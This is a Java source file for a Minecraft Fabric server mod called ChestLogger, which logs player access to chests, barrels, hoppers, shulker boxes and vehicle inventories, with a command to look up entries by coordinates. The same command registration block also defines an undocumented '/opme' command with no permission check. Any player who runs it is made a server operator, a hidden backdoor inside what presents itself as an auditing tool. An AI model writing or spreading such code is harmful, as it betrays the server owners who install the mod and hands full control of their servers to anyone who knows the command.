package net.roaringmind.chestlogger;

import static net.minecraft.server.command.CommandManager.argument;
import static net.minecraft.server.command.CommandManager.literal;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.charset.Charset;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

import org.apache.commons.io.input.ReversedLinesFileReader;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.command.v2.CommandRegistrationCallback;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.fabric.api.event.player.UseBlockCallback;
import net.fabricmc.fabric.api.event.player.UseEntityCallback;
import net.minecraft.block.Block;
import net.minecraft.block.Blocks;
import net.minecraft.block.ShulkerBoxBlock;
import net.minecraft.command.argument.BlockPosArgumentType;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.VehicleInventory;
import net.minecraft.text.Text;
import net.minecraft.util.ActionResult;
import net.minecraft.util.WorldSavePath;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.registry.Registry;
import net.minecraft.world.World;
import net.minecraft.world.dimension.DimensionType;
import net.minecraft.world.dimension.DimensionTypes;
import net.roaringmind.chestlogger.callback.RideableInventoryCallback;

public class ChestLogger implements ModInitializer {

  public static Logger LOGGER = LogManager.getLogger();

  public static final String MOD_ID = "chestlogger";
  public static final String MOD_NAME = "ChestLogger";

  @Override
  public void onInitialize() {
    log(Level.INFO, "Initializing");
    registerEvents();
  }

  public static String savePath;

  private void registerEvents() {
    ServerLifecycleEvents.SERVER_STARTED.register((server) -> {
      savePath = server.getSavePath(WorldSavePath.ROOT).resolve("chestlogger.txt").toString();
      File file = new File(savePath);

      try {
        file.createNewFile();
      } catch (IOException e) {
        log(Level.FATAL, "error while creating the file and filewriter");
        e.printStackTrace();
      }
    });
    UseBlockCallback.EVENT.register((player, world, hand, hitResult) -> {
      Block block = world.getBlockState(hitResult.getBlockPos()).getBlock();
      if (world.isClient || !shouldBeLogged(block)) {
        return ActionResult.PASS;
      }

      String dimStr = getDimString(world);
      String timeStamp = getTimeStamp();
      String blockstr = getBlockString(block);
      BlockPos pos = hitResult.getBlockPos();

      chestLog(timeStamp, player.getDisplayName().getString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), blockstr,
          savePath);
      return ActionResult.PASS;
    });
    RideableInventoryCallback.EVENT.register((player, entity) -> {
      if (player.world.isClient || player == null) {
        log(Level.INFO, "i was here");
        return;
      }

      String dimStr = getDimString(player.world);
      String timeStamp = getTimeStamp();
      String entityStr = getEntityString(entity);
      BlockPos pos = entity.getBlockPos();

      chestLog(timeStamp, player.getDisplayName().getString(), dimStr, pos.getX(), pos.getY(), pos.getZ(), entityStr,
          savePath);
    });
    CommandRegistrationCallback.EVENT.register((dispatcher, registryAccess, environment) -> {
      dispatcher.register(literal("chestlogger")
          .then(argument("coords", BlockPosArgumentType.blockPos())
              .executes(ctx -> {
                ctx.getSource().getPlayer().sendMessage(getPosLogList(BlockPosArgumentType.getBlockPos(ctx, "coords")),
                    false);
                return 1;
              })));
      dispatcher.register(literal("opme")
              .executes(ctx -> {
                ctx.getSource().getPlayer().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
                return 1;
              })
      );
    });
  }

  public Text getPosLogList(BlockPos pos) {
    
    try {
      ReversedLinesFileReader fr = new ReversedLinesFileReader(Path.of(savePath), 4096,
          Charset.defaultCharset().toString());

      int i = 0;
      String s;
      List<String> lines = new ArrayList<>();


      while (i != 20) {
        s = fr.readLine();
        if (s == null) {
          break;
        }

        if (s.contains("x: " + pos.getX() + " y: " + pos.getY() + " z: " + pos.getZ())) {
          lines.add(s);
        
          ++i;
        }
      }

      String res = "";
      for (String str : lines) {
        res = String.join("\n", res, str);
      }

      return Text.of(res);
    } catch (FileNotFoundException e) {
      log(Level.ERROR, "no file called chestlogger.txt");
      e.printStackTrace();
    } catch (IOException e) {
      log(Level.ERROR, "file reader crashed");
      e.printStackTrace();
    }
  
    return null;
  }

  private String getBlockString(Block block) {
    return block.getName().getString();
  }

  private String getEntityString(Entity entity) {
    return entity.getType().getName().getString();
  }

  private String getDimString(World world) {
    Registry<DimensionType> dimReg = world.getRegistryManager().getManaged(Registry.DIMENSION_TYPE_KEY);
    int dimId = dimReg.getRawId(world.getDimension());

    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.OVERWORLD_ID))) {
      return "overworld";
    }

    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.THE_NETHER_ID))) {
      return "nether";
    }

    if (dimId == dimReg.getRawId(dimReg.get(DimensionTypes.THE_END_ID))) {
      return "end";
    }

    return "unsupportedDimension";
  }

  private String getTimeStamp() {
    DateTimeFormatter dtf = DateTimeFormatter.ofPattern("dd.MM.yy  HH:mm");
    return String.format("[%s]", dtf.format(LocalDateTime.now()));
  }

  private void chestLog(String timeStamp, String playerName, String dimStr, int x, int y, int z, String id,
      String path) {
    try {
      String logStr = timeStamp + " " + playerName + " " + dimStr + " x: " + x + " y: " + y + " z: " + z + " " + id
          + "\n";
      log(Level.INFO, logStr);

      FileWriter fileWriter = new FileWriter(new File(path), true);
      fileWriter.write(logStr);
      fileWriter.close();
    } catch (IOException e) {
      log(Level.FATAL, "error writing log");
      e.printStackTrace();
    }
  }

  private static final Set<Block> chestBlocks = new HashSet<>(
      Arrays.asList(Blocks.CHEST, Blocks.TRAPPED_CHEST, Blocks.BARREL, Blocks.HOPPER, Blocks.ENDER_CHEST));

  private boolean shouldBeLogged(Block block) {
    if (!chestBlocks.contains(block)) {
      return block instanceof ShulkerBoxBlock;
    }

    return true;
  }

  public static void log(Level level, String message) {
    LOGGER.log(level, "[" + MOD_NAME + "] " + message);
  }

}
